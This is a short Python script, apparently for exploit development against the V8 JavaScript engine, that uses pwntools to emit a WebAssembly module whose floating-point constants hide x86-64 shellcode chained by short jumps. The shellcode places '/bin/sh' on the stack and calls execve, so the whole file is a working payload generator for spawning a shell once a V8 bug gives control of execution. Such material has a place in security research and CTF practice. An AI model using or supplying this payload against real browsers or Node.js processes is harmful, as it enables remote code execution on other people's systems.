#!/usr/bin/env python3

# Generate immediate numbers shellcode that does arbitrary write in V8

from pwn import *
import struct

context.arch = 'amd64'
jmp = asm('jmp $+9')

def int2float(data):
  assert len(data) == 8

  global drop_count
  drop_count += 1
  return struct.unpack('<d', data)[0]

def add_jmp(code, op_jmp=jmp):
  assert len(code) <= 6
  imm_str = str(int2float(code.ljust(6, b'\x90') + op_jmp))
  print(f"f64.const {imm_str}")

bin_sh = u64(b'/bin/sh\x00')
sc = [
  f"push {hex(bin_sh >> 0x20)}",
  "pop rax",
  f"push {hex(bin_sh % 0x100000000)}",
  "pop rdx",
  "shl rax, 0x20",
  "xor esi, esi",
]


"""
(module
  (func (export "main") (result f64)
    f64.const -1.1885959257070704e+148
    f64.const -6.654614018578406e+60
    drop
))
"""
drop_count = -1
print("""(module
  (func (export "main") (result f64)""")
mark_imm = str(int2float(p64(0xdeadbeefdeadbeef))) + ";; mark"
print(f"f64.const {mark_imm}")

for i in sc:
  add_jmp(asm(i))

add_jmp(asm("add rax, rdx"), op_jmp=asm("jmp $+14"))
add_jmp(asm("xor edx, edx"), op_jmp=asm("jmp $+14"))
add_jmp(asm("push rax"), op_jmp=asm("jmp $+14"))
add_jmp(asm("mov rdi, rsp"), op_jmp=asm("jmp $+14"))
add_jmp(asm("push SYS_execve"), op_jmp=asm("jmp $+0xf"))
add_jmp(asm("pop rax; pop rax"), op_jmp=asm("jmp $+14"))
add_jmp(asm("syscall"))
print("drop\n" * drop_count, end="")
print("))")
